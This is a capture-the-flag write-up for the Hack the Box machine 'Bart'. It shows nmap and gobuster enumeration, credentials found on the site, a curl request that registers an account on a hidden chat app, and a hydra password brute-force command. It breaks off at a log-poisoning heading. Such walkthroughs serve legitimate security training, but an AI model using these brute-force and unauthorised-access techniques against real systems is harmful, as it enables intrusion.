# Hack the Box - Bart

```CSS
Machine IP: 10.10.10.81 - Windows
Difficulty: Medium
Category: OSCP Preparation
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.81 -T4 --min-rate 1000 -oN bart-ports.nmap

Nmap scan report for 10.10.10.81
Host is up (0.19s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

```CSS
▶ nmap -sC -sV -p 80 10.10.10.81 -oN bart-services.nmap

Nmap scan report for 10.10.10.81
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
```

---

## HTTP 80
![image](https://user-images.githubusercontent.com/83878909/236593447-0affac53-e265-4702-b827-c5efcea433ec.png)
![image](https://user-images.githubusercontent.com/83878909/236593820-3e12c0f4-8a62-406b-9327-bc2a31f0dce8.png)

### Source
![image](https://user-images.githubusercontent.com/83878909/236599790-0c57cc12-20f2-4fe4-b083-fb60beaebf32.png)

```CSS
 - Harvey Potter
 - Developer@BART
 - h.potter@bart.htb
```

---

## Content Discovery
  - Directory brute-force on `http://10.10.10.81`. Tactical brute-forcing since everything returns a 200 OK status code.
```CSS
▶ gobuster dir --url http://10.10.10.81 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --status-codes 204,301,302,307 --status-codes-blacklist "" --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/236594591-2ce863d7-4f2c-4a71-a1d1-05ae772d2a5f.png)

  - `http://10.10.10.81/forum/`
![image](https://user-images.githubusercontent.com/83878909/236594545-b9e5b88c-51cc-4d35-b438-4f183f47accf.png)

  - `http://10.10.10.81/monitor/`
![image](https://user-images.githubusercontent.com/83878909/236594492-585124fd-9ad2-4c69-8e42-73ea8e9f3c17.png)

---

## User Credentials
 - Valid username `harvey`.
![image](https://user-images.githubusercontent.com/83878909/236599922-2b67ec2b-442a-4052-b6b7-d2b9a32013b6.png)
 - Valid password `potter`.
![image](https://user-images.githubusercontent.com/83878909/236600049-60666a88-2774-40e6-9c28-d963b1b3117b.png)
 - Login
![image](https://user-images.githubusercontent.com/83878909/236599993-c09e8014-d27d-450d-8895-5024f5090e8d.png)
 - Servers
![image](https://user-images.githubusercontent.com/83878909/236600158-b1e5d6c5-4a14-4aef-9e28-12cdf6823f2b.png)

---

## Internal Domain
![image](https://user-images.githubusercontent.com/83878909/236600307-c1d2080d-0b83-41bd-890d-a8f778723d15.png)

### Content Discovery
```CSS
▶ gobuster dir --url http://internal-01.bart.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --status-codes 204,301,302,307 --status-codes-blacklist "" --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/236602471-f965d25b-1847-4a7a-8793-2a4bfaa768f6.png)

```CSS
▶ gobuster dir --url http://internal-01.bart.htb/log --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --status-codes 204,301,302,307 --status-codes-blacklist "" --extensions php --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/236611172-db440f65-b6da-49bf-ad41-839630786278.png)
![image](https://user-images.githubusercontent.com/83878909/236611523-67fd19df-4b47-497f-8c93-72c26f451421.png)

```CSS
▶ gobuster dir --url http://internal-01.bart.htb/simple_chat --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --status-codes 204,301,302,307 --status-codes-blacklist "" --extensions php --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/236611108-bf91d63f-091e-43ad-b4d5-efba299950ab.png)

The source code for the chat server is on github: `https://github.com/magkopian/php-ajax-simple-chat`.
Looking at the code, it looks like the version running here removed the `register_form.php` page, and the link to it from the `login_form.php` page.

### Create User Account
 - Using curl create an account and get access to the site.
```CSS
▶ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=hardyboy&passwd=password"
```
![image](https://user-images.githubusercontent.com/83878909/236633671-13443158-ce89-4071-b9b5-0cf2855fb313.png)
![image](https://user-images.githubusercontent.com/83878909/236633708-78ee83d4-b630-4ff4-99b6-bb379a9cbd30.png)


### Brute-Force Credentials (Optional)
 - Brute-force password for user `Harvey`.
```CSS
hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-form-post "/simple_chat/login_form.php:uname=^USER^&^passwd=^PASS^&submit=Login:Password"
```


---

## Log Poisoning
  - Vulnerable Code
![image](https://user-images.githubusercontent.com/83878909/236633855-abf4ab67-f0d7-413e-abfa-a0ce7907cf27.png)
